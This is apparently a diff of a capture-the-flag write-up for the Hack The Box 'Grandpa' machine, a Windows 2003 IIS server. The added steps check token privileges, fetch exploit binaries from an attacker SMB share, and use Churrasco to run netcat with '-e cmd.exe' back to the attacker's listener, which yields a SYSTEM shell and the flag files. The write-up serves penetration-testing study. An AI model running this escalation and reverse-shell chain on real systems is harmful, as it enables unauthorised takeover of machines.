@@ -226,11 +226,26 @@ Shellcodes: No Results
 
 ```
 
-### Exploit IIS 6.0 supporting PUT and MOVE
+Privilege information of the user can reveal something for us
 
-Credits go to https://notsosecure.com/owning-iis-60-when-webserver-supports-put-and-move-http-methods
+```
+C:\WINDOWS\Temp>whoami /priv
+whoami /priv
 
-Did not try this vulnerability yet
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+```
+
+Bingo, SeImpersonatePrivilege means in newer operating systems potato exploit, and for 2003 Churrasco.
 
 ### Exploit CVE-2017-7269
 
@@ -307,7 +322,7 @@ Network Card(s):           N/A
 
 Windows exploit suggester is a good start, remember to use the version ported to python 3: https://raw.githubusercontent.com/aysebilgegunduz/Windows-Exploit-Suggester/pr_version/windows-exploit-suggester.py
 
-As ths is almost unpatched Windows 2003 SP2 32-bit, there are loads of vulnerabilities.
+As this is almost unpatched Windows 2003 SP2 32-bit, there are loads of vulnerabilities.
 
 Looks like the server does not have PowerShell installed.
 
@@ -325,22 +340,107 @@ kali㉿kali)-[~/…/CTF/hackthebox/Grandpa/MS15-051]
 And then fetch the file from the target host
 
 ```
-C:\WINDOWS\Temp>copy \\10.10.14.4\share\Taihou32.exe .
-copy \\10.10.14.4\share\Taihou32.exe .
+C:\WINDOWS\Temp>copy \\10.10.14.4\share\ms15-051.exe .
+copy \\10.10.14.10\share\ms15-051.exe .
         1 file(s) copied.
 
-C:\WINDOWS\Temp>dir
-dir
+C:\WINDOWS\Temp>ms15-051.exe
+ms15-051.exe
+[#] ms15-051 fixed by zcgonvh
+[#] usage: ms15-051 command 
+[#] eg: ms15-051 "whoami /all" 
+
+C:\WINDOWS\Temp>ms15-051.exe "whoami /all"
+ms15-051.exe "whoami /all"
+[#] ms15-051 fixed by zcgonvh
+[!] process with pid: 3704 created.
+==============================
+
+C:\WINDOWS\Temp>whoami
+whoami
+nt authority\network service
+```
+
+Note: The executable that worked was in the directory MS15-051-KB3045171/Source/ms15-051/Win32 of the repo.
+
+However, the exploit as such did not seem to work.
+
+### Churrasco
+
+Rinse and repeat to fetch the file, fetch also nc.exe.
+
+```
+C:\WINDOWS\Temp>copy \\10.10.14.10\share\Churrasco.exe .
+copy \\10.10.14.10\share\Churrasco.exe .
+        1 file(s) copied.
+
+C:\WINDOWS\Temp>copy \\10.10.14.10\share\nc.exe .
+copy \\10.10.14.10\share\nc.exe .
+        1 file(s) copied.
+```
+
+Execute Churrasco
+
+```
+C:\WINDOWS\Temp>Churrasco.exe "C:\WINDOWS\Temp\nc.exe -e cmd.exe 10.10.14.10 6666"
+Churrasco.exe "C:\WINDOWS\Temp\nc.exe -e cmd.exe 10.10.14.10 6666"
+/churrasco/-->Current User: NETWORK SERVICE 
+/churrasco/-->Getting Rpcss PID ...
+/churrasco/-->Found Rpcss PID: 668 
+/churrasco/-->Searching for Rpcss threads ...
+/churrasco/-->Found Thread: 672 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 676 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 684 
+/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
+/churrasco/-->Getting SYSTEM token from Rpcss Service...
+/churrasco/-->Found NETWORK SERVICE Token
+/churrasco/-->Found LOCAL SERVICE Token
+/churrasco/-->Found SYSTEM token 0x728
+/churrasco/-->Running command with SYSTEM Token...
+/churrasco/-->Done, command should have ran as SYSTEM!
+
+C:\WINDOWS\Temp>
+```
+
+And check what we have in our listener
+
+```
+$ nc -nvlp 6666              
+listening on [any] 6666 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.14] 1045
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\Temp>whoami
+whoami
+nt authority\system
+```
+
+Finally just fetch the flags
+
+```
+C:\WINDOWS\Temp>dir "c:\documents and settings\Harry\Desktop\user.txt"
+dir "c:\documents and settings\Harry\Desktop\user.txt"
  Volume in drive C has no label.
  Volume Serial Number is FDCB-B9EF
 
- Directory of C:\WINDOWS\Temp
+ Directory of c:\documents and settings\Harry\Desktop
 
-12/06/2021  06:08 PM    <DIR>          .
-12/06/2021  06:08 PM    <DIR>          ..
-12/06/2021  05:01 PM           168,771 Taihou32.exe
+04/12/2017  04:32 PM                32 user.txt
+               1 File(s)             32 bytes
+               0 Dir(s)   1,316,737,024 bytes free
+
+C:\WINDOWS\Temp>dir "c:\documents and settings\Administrator\Desktop\root.txt"
+dir "c:\documents and settings\Administrator\Desktop\root.txt"
+ Volume in drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of c:\documents and settings\Administrator\Desktop
+
+04/12/2017  04:29 PM                32 root.txt
+               1 File(s)             32 bytes
+               0 Dir(s)   1,316,732,928 bytes free
 ```
-
-Unfortunately this fails with "Program too big to fit in memory". Should compile it myself, but let's try something else.
-
 
